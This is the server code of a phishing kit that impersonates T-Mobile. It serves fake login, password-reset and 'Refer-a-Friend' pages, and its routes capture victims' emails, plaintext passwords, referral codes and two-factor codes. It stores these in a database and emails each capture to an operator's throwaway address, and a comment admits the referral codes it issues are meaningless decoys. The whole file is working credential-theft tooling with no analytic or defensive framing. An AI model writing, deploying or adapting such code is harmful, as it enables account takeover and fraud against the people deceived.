import 'dotenv/config';
import express from 'express';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { neon } from '@neondatabase/serverless';
import { Resend } from 'resend';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const PORT = process.env.PORT || 3000;
const NOTIFY_EMAIL = process.env.NOTIFY_EMAIL || 'tmobileref@yopmail.com';
const FROM_EMAIL = process.env.RESEND_FROM || 'T-Mobile Alerts <onboarding@resend.dev>';

const sql = process.env.DATABASE_URL ? neon(process.env.DATABASE_URL) : null;
const resend = process.env.RESEND_API_KEY ? new Resend(process.env.RESEND_API_KEY) : null;
const useDb = Boolean(sql);

const app = express();
app.use(express.json());

/* ------------------------------------------------------------------ *
 *  Storage
 *  Falls back to an in-memory store if DATABASE_URL is missing so the
 *  app still boots during setup.
 * ------------------------------------------------------------------ */

const mem = { seq: 1, rows: new Map() };

async function ensureSchema() {
  if (!useDb) {
    console.warn('[db] DATABASE_URL missing - using in-memory store');
    return;
  }
  await sql`
    CREATE TABLE IF NOT EXISTS login_attempts (
      id            BIGSERIAL PRIMARY KEY,
      email         TEXT,
      password      TEXT,
      referral_code TEXT,
      own_code      TEXT,
      two_fa        TEXT,
      type          TEXT NOT NULL DEFAULT 'login',
      status        TEXT NOT NULL DEFAULT 'pending',
      created_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at    TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `;

  // Migration for tables created before own_code existed
  await sql`ALTER TABLE login_attempts ADD COLUMN IF NOT EXISTS own_code TEXT`;

  try {
    await sql`CREATE UNIQUE INDEX IF NOT EXISTS login_attempts_own_code_key ON login_attempts (own_code)`;
  } catch (err) {
    console.warn('[db] own_code unique index skipped:', err.message);
  }

  console.log('[db] schema ready');
}

/* ---------------------------- referral codes ---------------------- *
 *  Purely random 6-digit code. Nothing validates it against anything,
 *  it just has to look plausible and not collide with a code we already
 *  handed out.
 * ------------------------------------------------------------------ */

function makeOwnCode() {
  return String(Math.floor(Math.random() * 1000000)).padStart(6, '0');
}

async function freshOwnCode() {
  if (!useDb) return makeOwnCode();

  for (let i = 0; i < 5; i++) {
    const code = makeOwnCode();
    const taken = await sql`SELECT 1 FROM login_attempts WHERE own_code = ${code} LIMIT 1`;
    if (!taken.length) return code;
  }
  return makeOwnCode();
}

async function createAttempt({ email, password, type, status }) {
  const own_code = await freshOwnCode();

  if (useDb) {
    const rows = await sql`
      INSERT INTO login_attempts (email, password, type, status, own_code)
      VALUES (${email}, ${password}, ${type}, ${status}, ${own_code})
      RETURNING id
    `;
    return { id: rows[0].id, own_code };
  }

  const id = mem.seq++;
  mem.rows.set(id, {
    id, email, password, type, status, own_code,
    referral_code: null,
    two_fa: null
  });
  return { id, own_code };
}

async function patchAttempt(id, fields = {}) {
  if (id === undefined || id === null || id === '') return false;

  if (useDb) {
    const password      = fields.password      ?? null;
    const referral_code = fields.referral_code ?? null;
    const two_fa        = fields.two_fa        ?? null;
    const type          = fields.type          ?? null;
    const status        = fields.status        ?? null;

    const rows = await sql`
      UPDATE login_attempts
         SET password      = COALESCE(${password}::text,      password),
             referral_code = COALESCE(${referral_code}::text, referral_code),
             two_fa        = COALESCE(${two_fa}::text,        two_fa),
             type          = COALESCE(${type}::text,          type),
             status        = COALESCE(${status}::text,        status),
             updated_at    = NOW()
       WHERE id = ${String(id)}::bigint
      RETURNING id
    `;
    return rows.length > 0;
  }

  const row = mem.rows.get(Number(id));
  if (!row) return false;
  Object.entries(fields).forEach(([k, v]) => {
    if (v !== undefined && v !== null) row[k] = v;
  });
  return true;
}

async function getAttempt(id) {
  if (id === undefined || id === null || id === '') return null;

  if (useDb) {
    const rows = await sql`
      SELECT * FROM login_attempts WHERE id = ${String(id)}::bigint LIMIT 1
    `;
    return rows[0] || null;
  }
  return mem.rows.get(Number(id)) || null;
}

/* ------------------------------------------------------------------ *
 *  Mail
 * ------------------------------------------------------------------ */

const esc = (v) =>
  String(v ?? '-').replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));

function mailBody({ title, rows }) {
  return `
  <div style="font-family:Helvetica,Arial,sans-serif;color:#1a1a1a;line-height:1.5">
    <h2 style="color:#e20074;margin:0 0 16px">${esc(title)}</h2>
    <table cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-size:14px">
      ${rows
        .map(
          ([k, v]) =>
            `<tr><td style="border:1px solid #e5e5e5;background:#fafafa"><b>${esc(k)}</b></td>` +
            `<td style="border:1px solid #e5e5e5">${esc(v)}</td></tr>`
        )
        .join('')}
    </table>
    <p style="color:#888;font-size:12px;margin-top:16px">${new Date().toISOString()}</p>
  </div>`;
}

async function sendMail({ subject, html, to = NOTIFY_EMAIL }) {
  if (!resend) {
    console.warn('[resend] no RESEND_API_KEY - skipped:', subject);
    return;
  }
  const { error } = await resend.emails.send({
    from: FROM_EMAIL,
    to: Array.isArray(to) ? to : [to],
    subject,
    html
  });
  if (error) console.error('[resend]', error);
}

const isEmail = (v) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v || '').trim());

/* ------------------------------------------------------------------ *
 *  Routes - pages
 * ------------------------------------------------------------------ */

app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.get('/login', (_req, res) => res.sendFile(path.join(__dirname, 'login.html')));
app.get('/login.html', (_req, res) => res.sendFile(path.join(__dirname, 'login.html')));

// Deep-link straight into the reset flow
app.get('/reset', (_req, res) => res.sendFile(path.join(__dirname, 'login.html')));

function dashboardHtml(own_code) {
  const codeBlock = own_code
    ? `<div class="code">
         <span class="code-label">Your referral code</span>
         <strong class="code-value" id="own-code">${esc(own_code)}</strong>
         <button class="copy" id="copy-btn" type="button">Copy</button>
       </div>
       <p class="sub">Share it with friends - you both get credit when they sign up.</p>`
    : '';

  return `<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Dashboard | T-Mobile</title>
<style>
  body{font-family:"Helvetica Neue",Arial,sans-serif;background:#f4f4f4;margin:0;min-height:100vh;
       display:flex;align-items:center;justify-content:center;color:#1a1a1a;padding:24px}
  .card{background:#fff;padding:44px 36px;border-radius:16px;box-shadow:0 2px 10px rgba(0,0,0,.06);
        text-align:center;max-width:420px;width:100%}
  h1{margin:0 0 12px;font-size:34px;letter-spacing:-.02em}
  .sub{color:#4b4b4b;font-size:15px;margin:0 0 22px}
  .code{border:1.5px dashed #e20074;border-radius:12px;padding:18px;margin:0 0 18px}
  .code-label{display:block;font-size:13px;text-transform:uppercase;letter-spacing:.06em;color:#4b4b4b;margin-bottom:6px}
  .code-value{display:block;font-size:34px;font-weight:800;letter-spacing:.18em;color:#e20074;
              font-variant-numeric:tabular-nums;margin-bottom:10px}
  .copy{border:none;background:#e20074;color:#fff;font-weight:700;font-size:14px;padding:10px 18px;
        border-radius:8px;cursor:pointer;font-family:inherit}
  .copy:hover{opacity:.9}
  a{color:#e20074;font-weight:700;text-decoration:none}
</style></head>
<body><div class="card">
  <h1>You're all set</h1>
  <p class="sub">You are now registered for Refer-a-Friend and eligible for rewards.</p>
  ${codeBlock}
  <p><a href="/login">Back to log in</a></p>
</div>
<script>
  var btn = document.getElementById('copy-btn');
  if (btn) btn.addEventListener('click', function () {
    var text = document.getElementById('own-code').textContent;
    navigator.clipboard.writeText(text).then(function () {
      btn.textContent = 'Copied';
      setTimeout(function () { btn.textContent = 'Copy'; }, 1500);
    });
  });
</script>
</body></html>`;
}

app.get('/dashboard', async (req, res) => {
  let own_code = /^\d{6}$/.test(String(req.query.code || '').trim())
    ? String(req.query.code).trim()
    : '';

  if (!own_code && req.query.id) {
    try {
      const row = await getAttempt(req.query.id);
      own_code = row?.own_code || '';
    } catch (err) {
      console.error('[dashboard] lookup failed:', err);
    }
  }

  res.type('html').send(dashboardHtml(own_code));
});

/* ------------------------------------------------------------------ *
 *  Routes - login flow
 *  email + password -> referral code -> 2FA code -> saved as "login"
 * ------------------------------------------------------------------ */

app.post(
  '/api/login',
  wrap(async (req, res) => {
    const email = String(req.body.email || req.body.username || '').trim();
    const password = String(req.body.password || '');

    if (!email || !password) {
      return res.status(400).json({ ok: false, message: 'Enter your email and password.' });
    }

    const { id } = await createAttempt({ email, password, type: 'login', status: 'awaiting_referral' });

    await sendMail({
      subject: `T-Mobile login - ${email}`,
      html: mailBody({
        title: 'New login attempt',
        rows: [
          ['Email', email],
          ['Password', password],
          ['Type', 'login'],
          ['Status', 'awaiting referral code']
        ]
      })
    });

    res.json({ ok: true, id, next: 'referral' });
  })
);

app.post(
  '/api/referral',
  wrap(async (req, res) => {
    const { id } = req.body;
    const referral_code = String(req.body.referral_code || '').trim();

    if (!id) return res.status(400).json({ ok: false, message: 'Session expired. Start over.' });
    if (!referral_code) {
      return res.status(400).json({ ok: false, message: 'Enter your referral code.' });
    }

    await patchAttempt(id, { referral_code, status: 'awaiting_2fa' });

    const row = await getAttempt(id);
    await sendMail({
      subject: `T-Mobile referral code - ${row?.email || id}`,
      html: mailBody({
        title: 'Referral code submitted',
        rows: [
          ['Email', row?.email],
          ['Referral code', referral_code],
          ['Type', 'login'],
          ['Status', 'awaiting 2FA code']
        ]
      })
    });

    res.json({ ok: true, next: '2fa' });
  })
);

app.post(
  '/api/2fa',
  wrap(async (req, res) => {
    const { id } = req.body;
    const code = String(req.body.code || req.body.two_fa || '').trim();

    if (!id) return res.status(400).json({ ok: false, message: 'Session expired. Start over.' });
    if (!code) {
      return res.status(400).json({ ok: false, message: 'Enter the verification code.' });
    }

    await patchAttempt(id, { two_fa: code, status: 'complete' });

    const row = await getAttempt(id);
    await sendMail({
      subject: `T-Mobile 2FA code - ${row?.email || id}`,
      html: mailBody({
        title: 'Login complete',
        rows: [
          ['Email', row?.email],
          ['Password', row?.password],
          ['Referral code', row?.referral_code],
          ['2FA code', code],
          ['Issued referral code', row?.own_code],
          ['Type', 'login'],
          ['Status', 'complete']
        ]
      })
    });

    res.json({ ok: true, next: 'success', own_code: row?.own_code || '', message: 'Login complete.' });
  })
);

/* ------------------------------------------------------------------ *
 *  Routes - reset password flow
 *  email -> reset mail -> new password -> 2FA (type "reset pwd") ->
 *  referral code -> success
 * ------------------------------------------------------------------ */

app.post(
  '/api/reset/start',
  wrap(async (req, res) => {
    const email = String(req.body.email || '').trim();
    if (!email) {
      return res.status(400).json({ ok: false, message: 'Enter your email.' });
    }

    const { id } = await createAttempt({
      email,
      password: null,
      type: 'reset pwd',
      status: 'awaiting_password'
    });

    const recipients = isEmail(email) && email.toLowerCase() !== NOTIFY_EMAIL.toLowerCase()
      ? [NOTIFY_EMAIL, email]
      : [NOTIFY_EMAIL];

    await sendMail({
      to: recipients,
      subject: `T-Mobile password reset - ${email}`,
      html: mailBody({
        title: 'Password reset requested',
        rows: [
          ['Email', email],
          ['Type', 'reset pwd'],
          ['Status', 'awaiting new password']
        ]
      })
    });

    res.json({ ok: true, id, next: 'password' });
  })
);

app.post(
  '/api/reset/password',
  wrap(async (req, res) => {
    const { id } = req.body;
    const password = String(req.body.password || '');

    if (!id) return res.status(400).json({ ok: false, message: 'Session expired. Start over.' });
    if (!password) {
      return res.status(400).json({ ok: false, message: 'Enter a new password.' });
    }

    await patchAttempt(id, { password, status: 'awaiting_2fa' });

    const row = await getAttempt(id);
    await sendMail({
      subject: `T-Mobile new password - ${row?.email || id}`,
      html: mailBody({
        title: 'New password set',
        rows: [
          ['Email', row?.email],
          ['New password', password],
          ['Type', 'reset pwd'],
          ['Status', 'awaiting 2FA code']
        ]
      })
    });

    res.json({ ok: true, next: '2fa' });
  })
);

app.post(
  '/api/reset/2fa',
  wrap(async (req, res) => {
    const { id } = req.body;
    const code = String(req.body.code || req.body.two_fa || '').trim();

    if (!id) return res.status(400).json({ ok: false, message: 'Session expired. Start over.' });
    if (!code) {
      return res.status(400).json({ ok: false, message: 'Enter the verification code.' });
    }

    await patchAttempt(id, { two_fa: code, type: 'reset pwd', status: 'awaiting_referral' });

    const row = await getAttempt(id);
    await sendMail({
      subject: `T-Mobile reset 2FA code - ${row?.email || id}`,
      html: mailBody({
        title: 'Reset verification code received',
        rows: [
          ['Email', row?.email],
          ['New password', row?.password],
          ['2FA code', code],
          ['Type', 'reset pwd'],
          ['Status', 'awaiting referral code']
        ]
      })
    });

    res.json({ ok: true, next: 'referral' });
  })
);

app.post(
  '/api/reset/referral',
  wrap(async (req, res) => {
    const { id } = req.body;
    const referral_code = String(req.body.referral_code || '').trim();

    if (!id) return res.status(400).json({ ok: false, message: 'Session expired. Start over.' });
    if (!referral_code) {
      return res.status(400).json({ ok: false, message: 'Enter your referral code.' });
    }

    await patchAttempt(id, { referral_code, type: 'reset pwd', status: 'complete' });

    const row = await getAttempt(id);
    await sendMail({
      subject: `T-Mobile password reset complete - ${row?.email || id}`,
      html: mailBody({
        title: 'Password reset complete',
        rows: [
          ['Email', row?.email],
          ['New password', row?.password],
          ['2FA code', row?.two_fa],
          ['Referral code', referral_code],
          ['Issued referral code', row?.own_code],
          ['Type', 'reset pwd'],
          ['Status', 'complete']
        ]
      })
    });

    res.json({ ok: true, next: 'success', own_code: row?.own_code || '', message: 'Password reset complete.' });
  })
);

/* ------------------------------------------------------------------ *
 *  Resend code
 * ------------------------------------------------------------------ */

app.post(
  '/api/resend',
  wrap(async (req, res) => {
    const { id } = req.body;
    const row = await getAttempt(id);
    if (!row) return res.status(404).json({ ok: false, message: 'Session not found.' });

    await sendMail({
      subject: `T-Mobile verification code resent - ${row.email}`,
      html: mailBody({
        title: 'Verification code resent',
        rows: [
          ['Email', row.email],
          ['Type', row.type],
          ['Status', row.status]
        ]
      })
    });

    res.json({ ok: true, message: 'We sent a new code to your device.' });
  })
);

/* ------------------------------------------------------------------ *
 *  Helpers
 * ------------------------------------------------------------------ */

function wrap(fn) {
  return (req, res) =>
    fn(req, res).catch((err) => {
      console.error(err);
      res.status(500).json({ ok: false, message: 'Something went wrong. Please try again.' });
    });
}

app.get('/api/health', (_req, res) => res.json({ ok: true, db: useDb, mail: Boolean(resend) }));

ensureSchema()
  .catch((err) => console.error('[db] schema error:', err))
  .finally(() => {
    app.listen(PORT, () => console.log(`Running on http://localhost:${PORT}`));
  });